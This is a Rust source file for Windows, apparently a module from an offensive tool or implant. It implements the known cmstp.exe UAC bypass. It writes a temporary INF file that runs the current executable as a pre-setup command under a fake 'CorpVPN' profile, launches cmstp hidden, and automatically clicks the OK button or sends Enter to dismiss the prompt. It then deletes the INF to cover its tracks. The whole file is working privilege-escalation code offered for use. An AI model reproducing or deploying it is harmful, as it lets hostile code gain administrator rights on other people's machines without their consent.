use std::env;
use std::ffi::CString;
use std::fs::File;
use std::io::Write;
use std::os::windows::process::CommandExt;
use std::path::Path;
use std::process::{Command, Stdio};
use std::ptr::null_mut;
use std::thread;
use std::time::Duration;

use winapi::um::winuser::{
    FindWindowA, FindWindowExA, SendInput, SendMessageA, SetForegroundWindow, ShowWindow,
    BM_CLICK, INPUT, INPUT_KEYBOARD, KEYBDINPUT, SW_SHOWNORMAL, VK_RETURN,
};

pub use crate::utils::admin::is_admin;

static INF_TEMPLATE: &str = r#"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"#;

pub fn attempt_uac_bypass() -> bool {
    let exe_path = match env::current_exe() {
        Ok(path) => path.to_string_lossy().to_string(),
        Err(_) => return false,
    };

    let temp_dir = r"C:\windows\temp";
    let random_file_name = format!("{}\\{}.inf", temp_dir, uuid::Uuid::new_v4());
    let inf_data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", &format!("\"{}\"", exe_path));

    if File::create(&random_file_name)
        .and_then(|mut file| file.write_all(inf_data.as_bytes()))
        .is_err()
    { return false; }

    let binary_path = r"C:\windows\system32\cmstp.exe";
    if !Path::new(binary_path).exists() {
        let _ = std::fs::remove_file(&random_file_name);
        return false;
    }

    let mut child = match Command::new(binary_path)
        .arg("/au")
        .arg(&random_file_name)
        .creation_flags(0x08000000)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(child) => child,
        Err(_) => {
            let _ = std::fs::remove_file(&random_file_name);
            return false;
        }
    };

    thread::sleep(Duration::from_millis(1000));

    let window_titles = ["CorpVPN", "cmstp"];
    let mut interacted = false;

    for title in &window_titles {
        if interact_with_window(title) {
            interacted = true;
            break;
        }
    }

    if !interacted {
        send_enter_key();
    }

    let result = child.wait().is_ok();
    let _ = std::fs::remove_file(&random_file_name);

    result
}

fn interact_with_window(window_title: &str) -> bool {
    let class_name = match CString::new(window_title) {
        Ok(name) => name,
        Err(_) => return false,
    };

    for _ in 0..30 {
        unsafe {
            let hwnd = FindWindowA(null_mut(), class_name.as_ptr());
            if !hwnd.is_null() {
                SetForegroundWindow(hwnd);
                ShowWindow(hwnd, SW_SHOWNORMAL);

                if let Ok(ok_cstr) = CString::new("OK") {
                    let ok_button = FindWindowExA(hwnd, null_mut(), null_mut(), ok_cstr.as_ptr());

                    if !ok_button.is_null() {
                        SendMessageA(ok_button, BM_CLICK, 0, 0);
                        return true;
                    }
                }
                send_enter_key();
                return true;
            }
        }
        thread::sleep(Duration::from_millis(100));
    }

    false
}

fn send_enter_key() {
    unsafe {
        let mut input = INPUT {
            type_: INPUT_KEYBOARD,
            u: std::mem::zeroed(),
        };

        *input.u.ki_mut() = KEYBDINPUT {
            wVk: VK_RETURN as u16,
            wScan: 0,
            dwFlags: 0,
            time: 0,
            dwExtraInfo: 0,
        };

        SendInput(1, &mut input, std::mem::size_of::<INPUT>() as i32);
    }
}
